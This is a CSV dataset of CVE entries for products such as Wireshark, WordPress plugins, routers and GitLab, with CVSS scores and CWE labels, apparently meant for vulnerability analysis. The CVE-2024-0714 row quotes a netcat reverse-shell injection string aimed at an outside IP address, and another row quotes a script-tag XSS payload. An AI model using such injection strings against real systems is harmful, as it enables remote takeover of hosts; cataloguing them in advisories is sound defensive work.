CVE,Description,CVSS3_BaseScore,CWE
CVE-2022-3724,Crash in the USB HID protocol dissector in Wireshark 3.6.0 to 3.6.8 allows denial of service via packet injection or crafted capture file on Windows,6.3,CWE-134
CVE-2024-44042,Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in Fahad Mahmood WP Datepicker allows Stored XSS.This issue affects WP Datepicker: from n/a through 2.1.1.,5.9,CWE-79
CVE-2024-30915,An issue was discovered in OpenDDS commit b1c534032bb62ad4ae32609778de6b8d6c823a66 allows a local attacker to cause a denial of service and obtain sensitive information via the max_samples parameter within the DataReaderQoS component.,4.3,CWE-400
CVE-2023-26435,It was possible to call filesystem and network references using the local LibreOffice instance using manipulated ODT documents. Attackers could discover restricted network topology and services as well as including local files with read permissions of the open-xchange system user. This was limited to specific file-types like images. We have improved existing content filters and validators to avoid including any local resources. No publicly available exploits are known.  ,5.0,CWE-918
CVE-2024-40629,JumpServer is an open-source Privileged Access Management (PAM) tool that provides DevOps and IT teams with on-demand and secure access to SSH RDP Kubernetes Database and RemoteApp endpoints through a web browser. An attacker can exploit the Ansible playbook to write arbitrary files leading to remote code execution (RCE) in the Celery container. The Celery container runs as root and has database access allowing an attacker to steal all secrets for hosts create a new JumpServer account with admin privileges or manipulate the database in other ways. This issue has been patched in release versions 3.10.12 and 4.0.0. It is recommended to upgrade the safe versions. There are no known workarounds for this vulnerability.,10.0,CWE-22
CVE-2025-1110,An issue has been discovered in GitLab CE/EE affecting all versions from 18.0 before 18.0.1. In certain circumstances a user with limited permissions could access Job Data via a crafted GraphQL query.,2.7,CWE-1220
CVE-2024-9506,Improper regular expression in Vue's parseHTML function leads to a potential regular expression denial of service vulnerability.,3.7,CWE-1333
CVE-2025-23639,Cross-Site Request Forgery (CSRF) vulnerability in Nazmul Ahsan MDC YouTube Downloader allows Stored XSS.This issue affects MDC YouTube Downloader: from n/a through 3.0.0.,7.1,CWE-352
CVE-2025-4733,A vulnerability which was classified as critical has been found in TOTOLINK A3002R and A3002RU 3.0.0-B20230809.1615. This issue affects some unknown processing of the file /boafrm/formIpQoS of the component HTTP POST Request Handler. The manipulation of the argument mac leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.,8.8,CWE-119
CVE-2022-37893,An authenticated command injection vulnerability exists in the Aruba InstantOS and ArubaOS 10 command line interface. Successful exploitation of this vulnerability results in the ability to execute arbitrary commands as a privileged user on the underlying operating system of Aruba InstantOS 6.4.x: 6.4.4.8-4.2.4.20 and below; Aruba InstantOS 6.5.x: 6.5.4.23 and below; Aruba InstantOS 8.6.x: 8.6.0.18 and below; Aruba InstantOS 8.7.x: 8.7.1.9 and below; Aruba InstantOS 8.10.x: 8.10.0.1 and below; ArubaOS 10.3.x: 10.3.1.0 and below; Aruba has released upgrades for Aruba InstantOS that address this security vulnerability.,7.8,CWE-78
CVE-2023-20102,A vulnerability in the web-based management interface of Cisco Secure Network Analytics could allow an authenticated remote attacker to execute arbitrary code on the underlying operating system. This vulnerability is due to insufficient sanitization of user-provided data that is parsed into system memory. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. A successful exploit could allow the attacker to execute arbitrary code on the underlying operating system as the administrator user.,8.8,CWE-502
CVE-2025-23845,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in ERA404 ImageMeta allows Reflected XSS. This issue affects ImageMeta: from n/a through 1.1.2.,7.1,CWE-79
CVE-2024-2497,A vulnerability was found in RaspAP raspap-webgui 3.0.9 and classified as critical. This issue affects some unknown processing of the file includes/provider.php of the component HTTP POST Request Handler. The manipulation of the argument country leads to code injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-256919. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,4.7,CWE-94
CVE-2022-39947,A improper neutralization of special elements used in an os command ('os command injection') in Fortinet FortiADC version 7.0.0 through 7.0.2 FortiADC version 6.2.0 through 6.2.3 FortiADC version version 6.1.0 through 6.1.6 FortiADC version 6.0.0 through 6.0.4 FortiADC version 5.4.0 through 5.4.5 may allow an attacker to execute unauthorized code or commands via specifically crafted HTTP requests.,8.8,CWE-78
CVE-2024-26166,Microsoft WDAC OLE DB provider for SQL Server Remote Code Execution Vulnerability,8.8,CWE-122
CVE-2024-13516,The Kubio AI Page Builder plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'message' parameter in all versions up to and including 2.3.5 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.,6.1,CWE-79
CVE-2023-6542,Due to lack of proper authorization checks in Emarsys SDK for Android an attacker can call a particular activity and can forward himself web pages and/or deep links without any validation directly from the host application. On successful attack an attacker could navigate to arbitrary URL including application deep links on the device.  ,7.1,CWE-863
CVE-2024-37082,When deploying Cloud Foundry together with the haproxy-boshrelease and using a non default configuration it might be possible to craft HTTP requests that bypass mTLS authentication to Cloud Foundry applications.   You are affected if you have route-services enabled in routing-release and have configured the haproxy-boshrelease property “ha_proxy.forwarded_client_cert” to “forward_only_if_route_service”.,9.1,CWE-290
CVE-2023-28598,Zoom for  Linux clients prior to 5.13.10 contain an HTML injection vulnerability. If a victim starts a chat with a malicious user it could result in a Zoom application crash.,7.5,CWE-79
CVE-2022-26469,In MtkEmail there is a possible escalation of privilege due to fragment injection. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07216598; Issue ID: ALPS07216598.,7.8,CWE-470
CVE-2023-6601,A flaw was found in FFmpeg's HLS demuxer. This vulnerability allows bypassing unsafe file extension checks and triggering arbitrary demuxers via base64-encoded data URIs appended with specific file extensions.,4.7,CWE-99
CVE-2021-45891,An issue was discovered in Softwarebuero Zauner ARC 4.2.0.4. that allows attackers to escalate privileges within the application since all permission checks are done client-side not server-side.,8.8,CWE-669
CVE-2023-36109,Buffer Overflow vulnerability in JerryScript version 3.0 allows remote attackers to execute arbitrary code via ecma_stringbuilder_append_raw component at /jerry-core/ecma/base/ecma-helpers-string.c.,9.8,CWE-120
CVE-2022-3357,The Smart Slider 3 WordPress plugin before 3.5.1.11 unserialises the content of an imported file which could lead to PHP object injection issues when a user import (intentionally or not) a malicious file and a suitable gadget chain is present on the site.,8.8,CWE-502
CVE-2024-0787,phpIPAM version 1.5.1 contains a vulnerability where an attacker can bypass the IP block mechanism to brute force passwords for users by using the 'X-Forwarded-For' header. The issue lies in the 'get_user_ip()' function in 'class.Common.php' at lines 1044 and 1045 where the presence of the 'X-Forwarded-For' header is checked and used instead of 'REMOTE_ADDR'. This vulnerability allows attackers to perform brute force attacks on user accounts including the admin account. The issue is fixed in version 1.7.0.,5.9,CWE-307
CVE-2024-47780,TYPO3 is a free and open source Content Management Framework. Backend users could see items in the backend page tree without having access if the mounts pointed to pages restricted for their user/group or if no mounts were configured but the pages allowed access to everybody. However affected users could not manipulate these pages. Users are advised to update to TYPO3 versions 10.4.46 ELTS 11.5.40 LTS 12.4.21 LTS 13.3.1 that fix the problem described. There are no known workarounds for this vulnerability.,3.1,CWE-863
CVE-2022-22085,Memory corruption in video due to buffer overflow while reading the dts file in Snapdragon Auto Snapdragon Compute Snapdragon Connectivity Snapdragon Consumer IOT Snapdragon Industrial IOT Snapdragon Mobile Snapdragon Voice & Music Snapdragon Wearables,8.4,CWE-787
CVE-2023-6864,Memory safety bugs present in Firefox 120 Firefox ESR 115.5 and Thunderbird 115.5. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code. This vulnerability affects Firefox ESR < 115.6 Thunderbird < 115.6 and Firefox < 121.,8.8,CWE-787
CVE-2024-6065,A vulnerability was found in itsourcecode Bakery Online Ordering System 1.0. It has been rated as critical. This issue affects some unknown processing of the file index.php. The manipulation of the argument user_email leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-268793 was assigned to this vulnerability.,7.3,CWE-89
CVE-2023-0241,pgAdmin 4 versions prior to v6.19 contains a directory traversal vulnerability. A user of the product may change another user's settings or alter the database.,6.5,CWE-22
CVE-2022-27202,Jenkins Extended Choice Parameter Plugin 346.vd87693c5a_86c and earlier does not escape the value and description of extended choice parameters of radio buttons or check boxes type resulting in a stored cross-site scripting (XSS) vulnerability exploitable by attackers with Item/Configure permission.,5.4,CWE-79
CVE-2022-29420,Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in Adam Skaat Countdown & Clock (WordPress plugin) countdown-builder allows Stored XSS.This issue affects Countdown & Clock (WordPress plugin): from n/a through 2.3.2.,5.9,CWE-79
CVE-2023-41928,The device is observed to accept deprecated TLS protocols increasing the risk of cryptographic weaknesses.,5.3,CWE-327
CVE-2024-47172,Computer Vision Annotation Tool (CVAT) is an interactive video and image annotation tool for computer vision. An attacker with a CVAT account may retrieve certain information about any project task job or membership resource on the CVAT instance. The information exposed in this way is the same as the information returned on a GET request to the resource. In addition the attacker can also alter the default source and target storage associated with any project or task. Upgrade to CVAT 2.19.1 or any later version to fix the issue.,5.4,CWE-863
CVE-2022-34676,NVIDIA GPU Display Driver for Linux contains a vulnerability in the kernel mode layer handler where an out-of-bounds read may lead to denial of service information disclosure or data tampering.,7.1,CWE-197
CVE-2024-5773,A vulnerability which was classified as critical was found in Netentsec NS-ASG Application Security Gateway 6.3. Affected is an unknown function of the file /protocol/firewall/deletemacbind.php. The manipulation of the argument messagecontent leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-267456. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,6.3,CWE-89
CVE-2025-32242,Missing Authorization vulnerability in Hive Support Hive Support allows Accessing Functionality Not Properly Constrained by ACLs. This issue affects Hive Support: from n/a through 1.2.2.,6.5,CWE-862
CVE-2024-34661,Improper handling of insufficient permissions in Samsung Assistant prior to version 9.1.00.7 allows remote attackers to access location data. User interaction is required for triggering this vulnerability.,4.3,CWE-276
CVE-2023-46542,TOTOLINK X2000R Gh v1.0.0-B20230221.0948.web was discovered to contain a stack overflow via the function formMeshUploadConfig.,9.8,CWE-787
CVE-2024-31977,Adtran 834-5 11.1.0.101-202106231430 and fixed as of SmartOS Version 12.6.3.1 devices allow OS Command Injection via shell metacharacters to the Ping or Traceroute utility.,8.8,CWE-78
CVE-2023-4586,A vulnerability was found in the Hot Rod client. This security issue occurs as the Hot Rod client does not enable hostname validation when using TLS possibly resulting in a man-in-the-middle (MITM) attack.,7.4,CWE-20
CVE-2022-38541,Archery v1.8.3 to v1.8.5 was discovered to contain multiple SQL injection vulnerabilities via the start_time and stop_time parameters in the my2sql interface.,9.8,CWE-89
CVE-2021-34977,This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R7000 1.0.11.116_10.2.100 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the processing of SOAP requests. The issue results from the lack of proper authentication verification before performing a password reset. An attacker can leverage this vulnerability to reset the admin password. Was ZDI-CAN-13483.,8.8,CWE-288
CVE-2023-2767,The WordPress File Upload and WordPress File Upload Pro plugins for WordPress are vulnerable to Stored Cross-Site Scripting via admin settings in versions up to and including 4.19.1 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers with administrator-level permissions and above to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This only affects multi-site installations and installations where unfiltered_html has been disabled.,4.4,CWE-79
CVE-2023-1275,A vulnerability classified as problematic was found in SourceCodester Phone Shop Sales Managements System 1.0. This vulnerability affects unknown code of the file /osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php of the component CAPTCHA Handler. The manipulation leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-222598 is the identifier assigned to this vulnerability.,3.5,CWE-79
CVE-2022-34207,A cross-site request forgery (CSRF) vulnerability in Jenkins Beaker builder Plugin 1.10 and earlier allows attackers to connect to an attacker-specified URL.,6.5,CWE-352
CVE-2023-45241,Sensitive information leak through log files. The following products are affected: Acronis Cyber Protect Cloud Agent (Linux macOS Windows) before build 35739 Acronis Cyber Protect 16 (Linux macOS Windows) before build 37391.,5.5,CWE-532
CVE-2025-43545,Bridge versions 15.0.3 14.1.6 and earlier are affected by an Access of Uninitialized Pointer vulnerability that could result in arbitrary code execution in the context of the current user. Exploitation of this issue requires user interaction in that a victim must open a malicious file.,7.8,CWE-824
CVE-2024-36378,In JetBrains TeamCity before 2024.03.2 server was susceptible to DoS attacks with incorrect auth tokens,5.9,CWE-770
CVE-2024-37266,Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in Themeum Tutor LMS allows Path Traversal.This issue affects Tutor LMS: from n/a through 2.7.1.,4.9,CWE-22
CVE-2024-32608,HDF5 library through 1.14.3 has memory corruption in H5A__close resulting in the corruption of the instruction pointer and causing denial of service or potential code execution.,9.8,CWE-787
CVE-2024-52564,Inclusion of undocumented features or chicken bits issue exists in UD-LT1 firmware Ver.2.1.8 and earlier and UD-LT1/EX firmware Ver.2.1.8 and earlier. A remote attacker may disable the firewall function of the affected products. As a result an arbitrary OS command may be executed and/or configuration settings of the device may be altered.,7.5,CWE-1242
CVE-2023-37959,A missing permission check in Jenkins Sumologic Publisher Plugin 2.2.1 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL.,6.5,CWE-862
CVE-2022-23972,ASUS RT-AX56U’s SQL handling function has an SQL injection vulnerability due to insufficient user input validation. An unauthenticated LAN attacker to inject arbitrary SQL code to read modify and delete database.,8.8,CWE-89
CVE-2023-46199,Auth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Triberr plugin <= 4.1.1 versions.,5.9,CWE-79
CVE-2022-2685,A vulnerability was found in SourceCodester Interview Management System 1.0 and classified as problematic. This issue affects some unknown processing of the file /addQuestion.php. The manipulation of the argument question with the input <script>alert(1)</script> leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-205673 was assigned to this vulnerability.,3.5,CWE-79
CVE-2024-46341,TP-Link TL-WR845N(UN)_V4_190219 was discovered to transmit credentials in base64 encoded form which can be easily decoded by an attacker executing a man-in-the-middle attack.,8.0,CWE-522
CVE-2023-39068,Buffer Overflow vulnerability in NBD80S09S-KLC v.YK_HZXM_NBD80S09S-KLC_V4.03.R11.7601.Nat.OnvifC.20230414.bin and NBD80N32RA-KL-V3 v.YK_HZXM_NBD80N32RA-KL_V4.03.R11.7601.Nat.OnvifC.20220120.bin allows a remote attacker to casue a denial of service via a crafted request to the service.XM component.,7.5,CWE-120
CVE-2025-29811,Improper input validation in Windows Mobile Broadband allows an authorized attacker to elevate privileges locally.,7.8,CWE-20
CVE-2023-4008,An issue has been discovered in GitLab CE/EE affecting all versions starting from 15.9 before 16.0.8 all versions starting from 16.1 before 16.1.3 all versions starting from 16.2 before 16.2.2. It was possible to takeover GitLab Pages with unique domain URLs if the random string added was known.,5.3,CWE-708
CVE-2020-21685,Buffer Overflow vulnerability in hash_findi function in hashtbl.c in nasm 2.15rc0 allows remote attackers to cause a denial of service via crafted asm file.,5.5,CWE-787
CVE-2022-28199,NVIDIA’s distribution of the Data Plane Development Kit (MLNX_DPDK) contains a vulnerability in the network stack where error recovery is not handled properly which can allow a remote attacker to cause denial of service and some impact to data integrity and confidentiality.,6.5,CWE-1284
CVE-2022-32485,Dell BIOS contains an improper input validation vulnerability. A local authenticated malicious user may potentially exploit this vulnerability by using an SMI to gain arbitrary code execution in SMRAM.,7.5,CWE-20
CVE-2023-39467,Triangle MicroWorks SCADA Data Gateway certificate Information Disclosure Vulnerability. This vulnerability allows remote attackers to disclose sensitive information on affected installations of Triangle MicroWorks SCADA Data Gateway. Authentication is not required to exploit this vulnerability.  The specific flaw exists within the configuration of certificate web directory. The issue results from the exposure of sensitive information in the application webroot. An attacker can leverage this vulnerability to disclose sensitive information. Was ZDI-CAN-20798.,5.3,CWE-219
CVE-2024-10868,The Enter Addons – Ultimate Template Builder for Elementor plugin for WordPress is vulnerable to Information Exposure in all versions up to and including 2.1.9 via the Advanced Tabs widget due to insufficient restrictions on which posts can be included. This makes it possible for authenticated attackers with Contributor-level access and above to extract data from private or draft posts created by Elementor that they should not have access to.,4.3,CWE-639
CVE-2023-48349,In video decoder there is a possible out of bounds write due to a missing bounds check. This could lead to local denial of service with no additional execution privileges needed,5.5,CWE-787
CVE-2023-49375,JFinalCMS v5.0.0 was discovered to contain a Cross-Site Request Forgery (CSRF) vulnerability via /admin/friend_link/update.,8.8,CWE-352
CVE-2021-35113,Possible authentication bypass due to improper order of signature verification and hashing in the signature verification call in Snapdragon Auto Snapdragon Compute Snapdragon Consumer IOT Snapdragon Industrial IOT Snapdragon Mobile Snapdragon Wearables,7.3,CWE-347
CVE-2025-46238,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in rbaer List Last Changes allows Stored XSS. This issue affects List Last Changes: from n/a through 1.2.1.,6.5,CWE-79
CVE-2020-36844,The KnowBe4 Security Awareness Training application before 2020-01-10 allows reflected XSS. The response has a SCRIPT element that sets window.location.href to a JavaScript URL.,6.1,CWE-79
CVE-2024-4674,A vulnerability which was classified as problematic was found in Campcodes Complete Web-Based School Management System 1.0. This affects an unknown part of the file /view/show_friend_request.php. The manipulation of the argument my_index leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-263595.,3.5,CWE-79
CVE-2023-28991,Auth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in PI Websolution Order date Order pickup Order date time Pickup Location delivery date for WooCommerce plugin <= 3.0.19 versions.,5.9,CWE-79
CVE-2024-12853,The Modula Image Gallery plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the zip upload functionality in all versions up to and including 2.11.10. This makes it possible for authenticated attackers with Author-level access and above to upload arbitrary files on the affected site's server which may make remote code execution possible.,8.8,CWE-434
CVE-2024-4740,MXsecurity software versions v1.1.0 and prior are vulnerable because of the use of hard-coded credentials. This vulnerability could allow an attacker to tamper with sensitive data.,5.3,CWE-798
CVE-2024-2534,A vulnerability which was classified as critical was found in MAGESH-K21 Online-College-Event-Hall-Reservation-System 1.0. This affects an unknown part of the file /admin/users.php. The manipulation of the argument user_id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-256971. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,6.3,CWE-89
CVE-2024-2888,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor allows Stored XSS.This issue affects Post and Page Builder by BoldGrid – Visual Drag and Drop Editor: from n/a through 1.26.2.  ,6.5,CWE-79
CVE-2023-4457,Grafana is an open-source platform for monitoring and observability.  The Google Sheets data source plugin for Grafana versions 0.9.0 to 1.2.2 are vulnerable to an information disclosure vulnerability.  The plugin did not properly sanitize error messages making it potentially expose the Google Sheet API-key that is configured for the data source.  This vulnerability was fixed in version 1.2.2.  ,5.5,CWE-209
CVE-2023-20033,A vulnerability in Cisco IOS XE Software for Cisco Catalyst 3650 and Catalyst 3850 Series Switches could allow an unauthenticated remote attacker to cause an affected device to reload unexpectedly resulting in a denial of service (DoS) condition.    This vulnerability is due to improper resource management when processing traffic that is received on the management interface. An attacker could exploit this vulnerability by sending a high rate of traffic to the management interface. A successful exploit could allow the attacker to cause the device to reload resulting in a DoS condition.,8.6,CWE-770
CVE-2023-22388,Memory Corruption in Multi-mode Call Processor while processing bit mask API.,9.8,CWE-823
CVE-2025-4648,Download of Code Without Integrity Check vulnerability in Centreon web allows Reflected XSS. A user with elevated privileges can inject XSS by altering the content of a SVG media during the submit request. This issue affects web: from 24.10.0 before 24.10.5 from 24.04.0 before 24.04.11 from 23.10.0 before 23.10.22 from 23.04.0 before 23.04.27 from 22.10.0 before 22.10.29.,8.4,CWE-494
CVE-2023-3749,A local user could edit the VideoEdge configuration file and interfere with VideoEdge operation.,7.1,CWE-349
CVE-2022-0724,Insecure Storage of Sensitive Information in GitHub repository microweber/microweber prior to 1.3.,6.5,CWE-922
CVE-2024-13279,Session Fixation vulnerability in Drupal Two-factor Authentication (TFA) allows Session Fixation.This issue affects Two-factor Authentication (TFA): from 0.0.0 before 1.8.0.,9.8,CWE-384
CVE-2024-0714,A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,6.3,CWE-78
CVE-2024-28955,Affected devices create coredump files when crashed storing them with world-readable permission. Any local user of the device can examine the coredump files and research the memory contents. As for the details of affected product names model numbers and versions refer to the information provided by the respective vendors listed under [References].,5.9,CWE-732
CVE-2024-48788,An issue in YESCAM (com.yescom.YesCam.zwave) 1.0.2 allows a remote attacker to obtain sensitive information via the firmware update process.,7.5,CWE-319
CVE-2022-34960,The container package in MikroTik RouterOS 7.4beta4 allows an attacker to create mount points pointing to symbolic links which resolve to locations on the host device. This allows the attacker to mount any arbitrary file to any location on the host.,9.8,CWE-59
CVE-2022-39211,Nextcloud server is an open source personal cloud platform. In affected versions it was found that locally running webservices can be found and requested erroneously. It is recommended that the Nextcloud Server is upgraded to 23.0.8 or 24.0.4. It is recommended that the Nextcloud Enterprise Server is upgraded to 22.2.10.4 23.0.8 or 24.0.4. There are no known workarounds for this issue.,3.0,CWE-918
